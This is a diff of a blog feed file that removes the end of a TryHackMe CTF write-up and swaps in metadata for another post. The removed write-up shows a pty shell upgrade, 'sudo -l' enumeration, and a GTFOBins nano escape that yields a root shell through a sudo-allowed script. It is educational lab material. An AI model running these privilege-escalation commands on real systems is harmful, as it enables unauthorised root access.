-
-<p>Let’s try it for Mike.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/sumike.png" alt="sumike" /></p>
-
-<p>And it worked. If you get an error, run the following codes on the target machine.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/term.png" alt="term" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-CTRL + Z
-$ stty raw -echo;fg
-$ reset
-$ xterm
-</code></pre></div></div>
-
-<p>Let’s get the user flag.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/user-flag.png" alt="user-flag" /></p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h2 id="2--escalate-to-the-root-user">2.  Escalate to the root user</h2>
-
-<p>Good luck with the last step !</p>
-
-<p><br /></p>
-
-<h3 id="21-whats-the-root-flag">2.1 What’s the root flag?</h3>
-
-<p>Let’s try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/sudol.png" alt="sudol" /></p>
-
-<p>It seems we can run <code class="language-plaintext highlighter-rouge">rootkit.sh</code> with root privileges without requiring a password.</p>
-
-<p>Let’s see what’s in it.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/rootkit.png" alt="rootkit" /></p>
-
-<p>This means that we can use the <code class="language-plaintext highlighter-rouge">nano</code> to get root.</p>
-
-<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBins</a> to see if I can find anything about nano.</p>
-
-<p>Let’s try this.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/gtf.png" alt="gtf" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ export TERM=xterm
-$ sudo /bin/bash /opt/rootkit.sh
-$ read
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/gallery/opt.png" alt="opt" /></p>
-
-<p>After typing <code class="language-plaintext highlighter-rouge">read</code>, nano will open. Then we will do the following in order:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   ^R^X
-   reset; sh 1&gt;&amp;0 2&gt;&amp;0
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/gallery/execute.png" alt="execute" /></p>
-
-<p>And we are <code class="language-plaintext highlighter-rouge">root</code>. Yes!</p>
-
-<p><img src="/assets/img/tryhackme/gallery/rootin.png" alt="rootin" /></p>
-
-<p>Let’s get the root flag.</p>
-
-<p><img src="/assets/img/tryhackme/gallery/root-flag.png" alt="root-flag" /></p>
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care :wave:</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, rce, cms" /><summary type="html"><![CDATA[Try to exploit our image gallery system.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/gallery.png" /><media:content medium="image" url="http://localhost:4000/assets/img/gallery.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, xss, docker" /><summary type="html"><![CDATA[Can you take over The Marketplace’s infrastructure?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/marketplace.png" /><media:content medium="image" url="http://localhost:4000/assets/img/marketplace.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
